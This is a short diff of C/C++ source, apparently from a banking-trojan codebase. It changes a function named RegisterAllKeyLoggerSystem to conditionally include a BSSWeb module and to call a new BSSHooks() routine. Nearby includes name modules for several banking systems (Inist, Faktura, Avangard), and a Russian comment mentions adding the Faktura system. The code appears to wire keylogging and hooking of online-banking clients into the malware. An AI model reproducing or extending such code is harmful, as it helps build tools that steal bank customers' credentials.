@@ -10,9 +10,12 @@
 #include "Modules.h"
 
 #include "InistWeb.cpp"
-#include "BSSWeb.cpp"
 #include "FakturaWeb.cpp"
 #include "AvangardWeb.cpp"
+
+#ifndef BSSH
+	#include "BSSWeb.cpp"
+#endif
 
 //#include "BotDebug.h"
 
@@ -262,6 +265,10 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 
 	#ifdef BSSWebModule
 		BSSWeb::Init();
+	#endif
+
+	#ifdef BSSH
+		BSSHooks();
 	#endif
 
 	// Добавляем систему фактура
